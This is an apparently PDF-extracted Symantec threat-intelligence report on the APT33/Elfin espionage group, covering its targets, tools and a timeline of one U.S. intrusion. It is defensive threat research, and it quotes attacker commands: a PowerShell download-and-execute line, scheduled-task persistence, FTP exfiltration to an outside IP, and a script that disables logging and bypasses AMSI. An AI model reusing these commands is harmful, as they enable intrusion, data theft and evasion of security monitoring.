    "plain_text": "# Elfin: Relentless Espionage Group Targets Multiple Organizations in Saudi Arabia and U.S.\n\n**symantec.com/blogs/threat-intelligence/elfin-apt33-espionage**\n\nThe Elfin espionage group (aka APT33) has remained highly active over the past three years, attacking at least 50 organizations in\nSaudi Arabia, the United States, and a range of other countries.\n\nThe group, which first became active in late 2015 or early 2016, specializes in scanning for vulnerable websites and using this to\nidentify potential targets, either for attacks or creation of command and control (C&C) infrastructure. It has compromised a wide\nrange of targets, including governments along with organizations in the research, chemical, engineering, manufacturing,\nconsulting, finance, telecoms, and several other sectors.\n\nFigure 1. Elfin attacks by country, 2016 -2019\n\n## Many U.S. targets\n\n|Col1|symantec.com/blogs/threat-intelligence/elfin-apt33-espionage|\n|---|---|\n\n\n-----\n\nbeginning of 2016. However, the U.S. has also been a country of significant interest to the group, with 18 organizations attacked\nover the past three years, including a number of Fortune 500 companies.\n\nElfin targets in the U.S. have included organizations in the engineering, chemical, research, energy consultancy, finance, IT, and\nhealthcare sectors.\n\nFigure 2. Elfin attacks by sector, 2016-2019\n\nSome of these U.S. organizations may have been targeted by Elfin for the purpose of mounting supply chain attacks. In one\ninstance, a large U.S. company was attacked in the same month a Middle Eastern company it co-owns was also compromised.\n\nFigure 3. Elfin attacks by month, 2016-2019\n\n\n-----\n\nIn a recent wave of attacks during February 2019, Elfin attempted to exploit a known vulnerability (CVE-2018-20250) in WinRAR, the\nwidely used file archiving and compression utility capable of creating self-extracting archive files. The exploit was used against one\ntarget in the chemical sector in Saudi Arabia. If successfully exploited on an unpatched computer, the vulnerability could permit an\nattacker to install any file on the computer, which effectively permits code execution on the targeted computer.\n\nTwo users in the targeted organization received a file called \"JobDetails.rar\", which attempted to exploit the WinRAR vulnerability.\nThis file was likely delivered via a spear-phishing email. However, prior to this attempted attack, Symantec had rolled out proactive\n[protection against any attempt to exploit this vulnerability (Exp.CVE-2018-20250). This protection successfully protected the](https://www.symantec.com/security-center/writeup/2019-030106-2440-99)\ntargeted organization from being compromised.\n\n## The Shamoon connection\n\nElfin came under the spotlight in December 2018 when it was linked with a new wave of Shamoon attacks. One Shamoon victim in\n[Saudi Arabia had recently also been attacked by Elfin and had been infected with the Stonedrill malware (Trojan.Stonedrill) used](https://www.symantec.com/security-center/writeup/2017-030708-4403-99)\nby Elfin. Because the Elfin and the Shamoon attacks against this organization occurred so close together, there has been\nspeculation that the two groups may be linked. However, Symantec has found no further evidence to suggest Elfin was\nresponsible for these Shamoon attacks to date. We continue to monitor the activities of both groups closely.\n\n## Elfin’s toolset\n\nElfin has deployed a wide range of tools in its attacks including custom malware, commodity malware, and open-source hacking\ntools.\n\nCustom malware used by the group include:\n\n[Notestuk (Backdoor.Notestuk) (aka TURNEDUP): Malware that can be used to open a backdoor and gather information from](https://www.symantec.com/security-center/writeup/2017-082502-5203-99)\na compromised computer.\n[Stonedrill (Trojan.Stonedrill): Custom malware capable of opening a backdoor on an infected computer and downloading](https://www.symantec.com/security-center/writeup/2017-030708-4403-99)\nadditional files. The malware also features a destructive component, which can wipe the master boot record of an infected\ncomputer.\nAutoIt backdoor: A custom built backdoor written in the AutoIt scripting language.\n\nIn addition to its custom malware, Elfin has also used a number of commodity malware tools, available for purchase on the cyber\nunderground. These include:\n\n[Remcos (Backdoor.Remvio): A commodity remote administration tool (RAT) that can be used to steal information from an](https://www.symantec.com/security-center/writeup/2016-080303-1343-99)\ninfected computer.\n[DarkComet (Backdoor.Breut): Another commodity RAT used to open a backdoor on an infected computer and steal](http://www.symantec.com/security_response/writeup.jsp?docid=2012-021012-3004-99)\ninformation.\n[Quasar RAT (Trojan.Quasar): Commodity RAT that can be used to steal passwords and execute commands on an infected](https://www.symantec.com/security-center/writeup/2017-020114-1619-99)\ncomputer.\n[Pupy RAT (Backdoor.Patpoopy): Commodity RAT that can open a backdoor on an infected computer.](https://www.symantec.com/security-center/writeup/2017-022715-3830-99)\n[NanoCore (Trojan.Nancrat): Commodity RAT used to open a backdoor on an infected computer and steal information.](https://www.symantec.com/security-center/writeup/2014-050908-1738-99)\n[NetWeird (Trojan.Netweird.B): A commodity Trojan which can open a backdoor and steal information from the](https://www.symantec.com/security-center/writeup/2015-040111-3949-99#summary)\ncompromised computer. It may also download additional potentially malicious files.\n\nElfin also makes frequent use of a number of publicly available hacking tools, including:\n\n## Case study: How an Elfin attack unfolds\n\nIn this section, we describe in detail an Elfin attack on a U.S. organization. On February 12, 2018 at 16:45 (all times are in\nthe organization’s local time), an email was sent to the organization advertising a job vacancy at an American global service\nprovider. The email contained a malicious link to hxxp://mynetwork.ddns[DOT].net:880.\n\nThe recipient clicked the link and proceeded to download and open a malicious HTML executable file, which in turn loaded\ncontent from a C&C server via an embedded iframe. At the same time, code embedded within this file also executed a PowerShell\ncommand to download and execute a copy of chfeeds.vbe from the C&C server.\n\n[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};IEX(New-Object\nNet WebClient) DownloadString('hxxps://217 147 168[DOT]46:8088/index jpg');\n\n\n-----\n\na.run('%windir%\\\\System32\\\\cmd.exe /c PowerShell -window hidden schtasks.exe /CREATE /SC DAILY /TN \"1\" /TR\n\"C:\\\\Users\\\\%username%\\\\AppData\\\\Local\\\\Microsoft\\\\Feeds\\\\chfeeds.vbe\" /ST 01:00 /f && schtasks.exe /CREATE /SC DAILY\n/TN \"3\" /TR \"C:\\\\Users\\\\%username%\\\\AppData\\\\Local\\\\Microsoft\\\\Feeds\\\\chfeeds.vbe\" /ST 03:00 /f && schtasks.exe /CREATE\n/SC DAILY /TN \"5\" /TR \"C:\\\\Users\\\\%username%\\\\AppData\\\\Local\\\\Microsoft\\\\Feeds\\\\chfeeds.vbe\" /ST 05:00 /f &&\nschtasks.exe /CREATE /SC DAILY /TN \"7\" /TR \"C:\\\\Users\\\\%username%\\\\AppData\\\\Local\\\\Microsoft\\\\Feeds\\\\chfeeds.vbe\" /ST\n07:00 /f && schtasks.exe /CREATE /SC DAILY /TN \"9\" /TR\n\"C:\\\\Users\\\\%username%\\\\AppData\\\\Local\\\\Microsoft\\\\Feeds\\\\chfeeds.vbe\" /ST 09:00 /f && schtasks.exe /CREATE /SC DAILY\n/TN \"11\" /TR \"C:\\\\Users\\\\%username%\\\\AppData\\\\Local\\\\Microsoft\\\\Feeds\\\\chfeeds.vbe\" /ST 11:00 /f && schtasks.exe\n/CREATE /SC DAILY /TN \"13\" /TR \"C:\\\\Users\\\\%username%\\\\AppData\\\\Local\\\\Microsoft\\\\Feeds\\\\chfeeds.vbe\" /ST 13:00 /f &&\nschtasks.exe /CREATE /SC DAILY /TN \"15\" /TR \"C:\\\\Users\\\\%username%\\\\AppData\\\\Local\\\\Microsoft\\\\Feeds\\\\chfeeds.vbe\" /ST\n15:00 /f && schtasks.exe /CREATE /SC DAILY /TN \"17\" /TR\n\"C:\\\\Users\\\\%username%\\\\AppData\\\\Local\\\\Microsoft\\\\Feeds\\\\chfeeds.vbe\" /ST 17:00 /f && schtasks.exe /CREATE /SC DAILY\n/TN \"19\" /TR \"C:\\\\Users\\\\%username%\\\\AppData\\\\Local\\\\Microsoft\\\\Feeds\\\\chfeeds.vbe\" /ST 19:00 /f && schtasks.exe\n/CREATE /SC DAILY /TN \"21\" /TR \"C:\\\\Users\\\\%username%\\\\AppData\\\\Local\\\\Microsoft\\\\Feeds\\\\chfeeds.vbe\" /ST 21:00 /f &&\nschtasks.exe /CREATE /SC DAILY /TN \"23\" /TR \"C:\\\\Users\\\\%username%\\\\AppData\\\\Local\\\\Microsoft\\\\Feeds\\\\chfeeds.vbe\" /ST\n23:00 /f ')\n\nThe chfeeds.vbe file acts as a downloader and was used to download a second PowerShell script (registry.ps1). This script in turn\ndownloaded and executed a PowerShell backdoor known as POSHC2, a proxy-aware C&C framework, from the C&C server\n(hxxps:// host-manager.hopto.org). Later at 20:57, the attackers became active on the compromised machine and proceeded to\ndownload the archiving tool WinRAR.\n\n89.34.237.118  808  hxxp://89.34.237[DOT]118:808/Rar32.exe\n\nAt 23:29, the attackers then proceeded to deploy an updated version of their POSHC2 stager.\n\n192.119.15.35  880  hxxp://mynetwork.ddns[DOT]net:880/st-36-p4578.ps1\n\nThis tool was downloaded several times between 23:29 on February 12 and 07:47 on February 13.\n\nTwo days later, on February 14 at 15:12, the attackers returned and installed Quasar RAT onto the infected computer that\ncommunicated with a C&C server (217.147.168.123). Quasar RAT was installed to\nCSIDL_PROFILE\\appdata\\roaming\\microsoft\\crypto\\smss.exe.\n\nAt this point, the attackers ceased activity while maintaining access to the network until February 21. At 06:38, the attackers were\nobserved downloading a custom .NET FTP tool to the infected computer.\n\n192.119.15.36  880  hxxp://192.119.15[DOT]36:880/ftp.exe\n\nLater at 6:56, the attackers exfiltrated data using this FTP tool to a remote host:\n\nJsuObf.exe Nup#Tntcommand -s CSIDL_PROFILE\\appdata\\roaming\\adobe\\rar -a ftp://89.34.237.118:2020 -f /[REDACTED] -u\n\n[REDACTED] -p [REDACTED]\n\nActivity ceased until the attackers returned on March 5 and were observed using Quasar RAT to download a second custom AutoIt\nFTP exfiltration tool known as FastUploader from hxxp://192.119.15[DOT]36:880/ftp.exe. This tool was then installed to\ncsidl_profile\\appdata\\roaming\\adobe\\ftp.exe. FastUploader is a custom FTP tool designed to exfiltrate data at a faster rate than\ntraditional FTP clients.\n\nAt this point, additional activity from the attackers continued between March 5 into April, and on April 18 at 11:50, a second\nremote access tool known as DarkComet was deployed to csidl_profile\\appdata\\roaming\\microsoft\\windows\\start\nmenu\\programs\\startup\\smss.exe on the infected computer. This was quickly followed 15 seconds later by the installation of a\ncredential dumping to csidl_profile\\appdata\\roaming\\microsoft\\credentials\\dwm32.exe, and the execution of PowerShell\ncommands via PowerShell Empire, a freely available post-exploitation framework, to bypass logging on the infected machine.\n\n$GPF=[Ref].AsSeMBLy.GeTTYPe('System.Management.Automation.Utils').\"GEtFiE`LD\"\n('cachedGroupPolicySettings','N'+'onPublic,Static');If($GPF){$GPC=$GPF.GeTVALUE($NUlL);If($GPC['ScriptB'+'lockLogging'])\n{$GPC['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging']=0;$GPC['ScriptB'+'lockLogging']\n\n['EnableScriptBlockInvocationLogging']=0}$vAL=\n\n[COlLecTIons.GEneRic.DIctIoNARy[stRiNG,SyStEM.Object]]::nEw();$VAL.ADD('EnableScriptB'+'lockLogging',0);$VaL.Add\n\n\n-----\n\n[ _ _ p gg g ] $ } {[ ]\n('signatures','N'+'onPublic,Static').SETVAlue($NuLL,(New-ObjeCt ColLectiONs.GeNERic.HASHSEt[StrInG]))}\n\n[REF].AssemBLy.GetTyPE('System.Management.Automation.AmsiUtils')|?{$_}|%\n{$_.GEtFielD('amsiInitFailed','NonPublic,Static').SETValUe($nUll,$TrUE)};\n\nActivity continued throughout April where additional versions of DarkComet, POSHC2 implants, and an AutoIt backdoor were\ndeployed along with further credential dumping activities.\n\n## Active and agile attacker\n\nElfin is one of the most active groups currently operating in the Middle East, targeting a large number of organizations across a\ndiverse range of sectors. Over the past three years, the group has utilized a wide array of tools against its victims, ranging from\ncustom built malware to off-the-shelf RATs, indicating a willingness to continually revise its tactics and find whatever tools it takes\nto compromise its next set of victims.\n\n## Protection/Mitigation\n\nSymantec has the following protection in place to protect customers against these
